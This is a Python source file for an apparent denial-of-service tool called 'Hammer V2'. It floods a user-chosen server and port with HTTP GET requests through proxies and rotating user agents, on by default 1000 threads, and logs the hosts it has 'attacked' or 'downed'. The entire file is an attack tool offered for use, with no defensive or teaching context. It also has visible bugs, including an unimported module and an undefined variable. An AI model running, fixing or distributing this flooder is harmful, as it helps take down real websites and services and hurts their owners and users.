from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,random

def user_agent():
    global uagent
    uagent=[]
    with open ("ua.txt","r") as f:
        key = f.read() # reading ua(user agent)
        uagent.append(key)

def proxy():
    global prox
    with open("proxy.txt","r") as pr:
        key = pr.readlines() # reading proxy
    for i in range(len(key)):
        prox = random.choice(key).split(":")

def down_it():
    try:
        data = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive"""
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((prox[0],int(prox[1])))
            if s.sendto( packet, (host, int(port))):
                s.shutdown(1)
                print ("\033[94m <--packet sent to {0}:{1}! hammering--> \033[0m".format(host, int(port)))
            elif requests.head(f"http://{host}").status_code != 200:
                with open("Down.txt","a") as dw:
                    dw.write(f"{host}:{port} has been downed by this tool on Day : {times[0]}, Month : {times[1]}:{times[2]}, Time : {times[3]}, Year : {times[4]}\n")
            else:
                s.shutdown(1)
                print("\033[91m shut<->down\033[0m")
            time.sleep(.01)
    except socket.error:
        print("\033[91m Socket error, cannot connect to host!\033[0m")
        time.sleep(2)
    except KeyboardInterrupt:
        exit()


def dos():
    while True:
        item = q.get()
        down_it()
        q.task_done()

def type_slow(text):
    for letter in text:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(.02)

def usage():
    type_slow ('''\033[92m iFanpS Remaked [Hammer V2] \n
 usage : python3 HammerV2.py [-l] [-s] [-p] [-t]
 -l : logs attack (-l yes|no)
 -h : help
 -s : server ip
 -p : port default 80
 -t : turbo default 135 \033[0m''')
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    times = time.ctime(time.time()).split()
    optp = OptionParser(add_help_option=False,epilog="Hammers")
    optp.add_option("-l","--logs",dest="logs",help="save attack logs -l yes")
    optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
    optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
    optp.add_option("-t","--thread",type="int",dest="turbo",help="default 1000 thread")
    optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
    opts, args = optp.parse_args()
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.logs == 'yes':
        with open('logs_hammerv2.txt','a') as lg:
            lg.write(f"{host}:{port} is attacked on Day : {times[0]}, Month : {times[1]}:{times[2]}, Time : {times[3]}, Year : {times[4]}\n")
            lg.close()
    else:
        pass
    if opts.turbo is None:
        thr = 1000
    else:
        thr = opts.turbo

#task queue are q,w
q = Queue()

# main section to control all the definition
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
    type_slow("\033[94m Please wait... \n\033[0m")
    user_agent()
    proxy()
    time.sleep(1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91m Ip or Port is unreachable\033[0m")
        usage()
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
        #tasking
        item = 0
        while True:
            if (item>2000): # for no memory crash
                item=0
                time.sleep(.1)
            item = item + 1
            q.put(item)
q.join()
